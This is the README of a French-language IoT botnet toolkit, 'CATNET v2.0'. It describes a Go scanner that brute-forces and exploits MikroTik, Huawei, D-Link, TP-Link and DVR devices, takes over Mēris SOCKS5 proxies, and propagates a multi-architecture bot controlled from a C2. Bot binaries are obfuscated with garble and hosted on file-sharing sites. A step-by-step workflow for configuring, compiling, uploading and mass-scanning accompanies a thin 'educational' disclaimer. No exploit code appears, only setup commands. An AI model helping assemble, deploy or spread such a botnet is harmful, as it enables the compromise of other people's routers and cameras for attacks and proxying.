```
   ██████╗ █████╗ ████████╗███╗   ██╗███████╗████████╗
  ██╔════╝██╔══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
  ██║     ███████║   ██║   ██╔██╗ ██║█████╗     ██║   
  ██║     ██╔══██║   ██║   ██║╚██╗██║██╔══╝     ██║   
  ╚██████╗██║  ██║   ██║   ██║ ╚████║███████╗   ██║   
   ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   
```

<div align="center">

```
      /\_/\
     ( o.o )  ~ nyaa ~
      > ^ <
     /|   |\
    (_|   |_)
```

**`[ BY CAT TOOLS // v2.0 // 2026 ]`**

*Scanner IoT educatif — Multi-archi — MikroTik — Mēris Takeover*

![Python](https://img.shields.io/badge/Python-3.10+-green?style=for-the-badge&logo=python&logoColor=white)
![Go](https://img.shields.io/badge/Scanner-Go-00ADD8?style=for-the-badge&logo=go&logoColor=white)
![Platform](https://img.shields.io/badge/Target-IoT%2FLinux-FF6B35?style=for-the-badge)
![Arch](https://img.shields.io/badge/Arch-MIPS%20%7C%20ARM%20%7C%20x86-blueviolet?style=for-the-badge)
![License](https://img.shields.io/badge/License-Educational-red?style=for-the-badge)

</div>

---

## ⚠️ Avertissement

> Ce projet est **strictement éducatif**. L'utilisation sur des systèmes sans autorisation explicite est **illégale**. Les auteurs déclinent toute responsabilité en cas d'utilisation abusive.

---

## 🗂️ Structure

```
catnet/
├── main.py          ← Menu TUI interactif — compilation, upload, orchestration
├── fiber.go         ← Scanner Go — exploitation, brute-force, propagation
├── bot_discord.go   ← Agent déployé sur cibles (multi-archi)
└── builds/          ← Binaires compilés (auto-généré)
```

---

## ⚡ Fonctionnalités

| Module | Description |
|:------:|-------------|
| 🔍 **Scanner** | Scan réseau multi-port, goroutines parallèles, timeouts adaptatifs |
| 🤖 **Bot multi-archi** | MIPS · MIPSLE · ARM · ARM64 · x86 · x86\_64 · PPC · SH4 · M68K · SPARC |
| ☁️ **Upload auto** | catbox.moe / transfer.sh / 0x0.st / serveur perso — URLs embarquées au build |
| 🖥️ **Orchestration** | Sessions `screen`, scan par plages IP ou liste, jobs arrière-plan |
| 📡 **MikroTik** | CVE-2018-14847 · Brute API 8728 · SSH · Mēris SOCKS5 takeover |
| 💥 **HTTP Exploits** | Realtek · Huawei HG532 · D-Link · TP-Link · TOTOLINK · DVR · TR-069 |
| 📊 **Log viewer** | Vue live scanner, cibles, imports, IDB — menu `[t]` |

---

## 🔌 Ports par défaut

```
┌────────┬──────────────────────────────┐
│  PORT  │  SERVICE                     │
├────────┼──────────────────────────────┤
│   23   │  Telnet                      │
│   80   │  HTTP                        │
│  443   │  HTTPS                       │
│  2000  │  MikroTik Bandwidth-Test     │
│  5000  │  UPnP                        │
│  5678  │  Mēris SOCKS5               │
│  7547  │  TR-069 / CWMP               │
│  8080  │  HTTP Alt                    │
│  8291  │  MikroTik Winbox             │
│  8443  │  HTTPS Alt                   │
│  8728  │  RouterOS API                │
│  9527  │  DVR / Caméras               │
│ 34567  │  DVR / Caméras               │
│ 37215  │  Huawei HG532                │
└────────┴──────────────────────────────┘
```

---

## 📦 Installation

> Le programme **ne gère pas les dépendances automatiquement** — tout est manuel.

### 🐍 Python 3.10+
```bash
sudo apt update && sudo apt install -y python3 python3-pip
```

### 🐹 Go 1.21+ (obligatoire — version apt trop ancienne)
```bash
wget https://go.dev/dl/go1.22.4.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.22.4.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
go version
```

### 🔒 garble — obfuscation Go (optionnel)
```bash
go install mvdan.cc/garble@latest
echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc && source ~/.bashrc
```

### 🗺️ zmap
```bash
sudo apt install -y zmap
```
> **Raspberry Pi / ARM** — compiler depuis les sources si apt absent :
> ```bash
> sudo apt install -y cmake libgmp-dev libpcap-dev libjson-c-dev libbytesize-dev
> git clone https://github.com/zmap/zmap.git && cd zmap
> mkdir build && cd build && cmake .. && make -j$(nproc) && sudo make install
> ```

### 🛠️ Outils de base
```bash
sudo apt install -y screen masscan curl
```

### 🔧 Compilateurs croisés (bot multi-archi)
```bash
sudo apt install -y \
  gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu \
  gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu \
  gcc-sparc64-linux-gnu gcc-multilib libc6-dev-i386

# Fix erreur asm/socket.h
for arch in i386-linux-gnu mips-linux-gnu arm-linux-gnueabi aarch64-linux-gnu \
            powerpc-linux-gnu sh4-linux-gnu m68k-linux-gnu sparc64-linux-gnu; do
  sudo mkdir -p /usr/$arch/include
  sudo ln -sf /usr/include/asm-generic /usr/$arch/include/asm
done
```

---

## 🚀 Lancement

```bash
sudo python3 main.py
```
> Root requis pour zmap/masscan (raw sockets).

---

## 🔄 Flux de travail

```
[1] Services      →  configurer IP C2, port, mode distrib
[2] Compiler bot  →  compile bot_discord.go toutes archi
[3] Upload        →  upload binaires catbox.moe / serveur perso
[4] Compiler fiber →  scanner avec URLs bots embarquées
[5] Lancer scan   →  plage IP ou liste, choix ports
[t] Logs live     →  suivi en direct du scan
```

---

## ☁️ Distribution des binaires

| Mode | Description |
|------|-------------|
| `auto` | Upload catbox.moe / transfer.sh — aucune IP publique requise |
| `local` | fiber sert les fichiers — IP/port accessible depuis Internet |

**Serveur perso** → POST multipart `/upload.php` → `{"success":true,"url":"..."}`

---

## 🐛 Dépannage

**`garble: can't find Go toolchain`**
```bash
which go   # doit retourner /usr/local/go/bin/go
```

**`screen: command not found`**
```bash
sudo apt install -y screen
```

**`0 Attempted` après plusieurs minutes**
zmap n'a trouvé aucun host ouvert sur ce port. fiber attend stdin indéfiniment — tuer le screen, changer de plage ou de port.

**`asm/socket.h: No such file or directory`**
Voir section compilateurs croisés — symlinks asm-generic manquants.

**Bot ne s'exécute pas sur la cible**
`file bot.arm` pour vérifier l'archi. Utiliser `bot.mipsle` pour MIPS little-endian.

---

## Credits

**by cat-project-hat** *(we do the best for you)*

---

```
   /\_/\
  ( o.o )   CATNET v2.0 // BY CAT TOOLS // 2026
   > ^ <
  /_____\
```
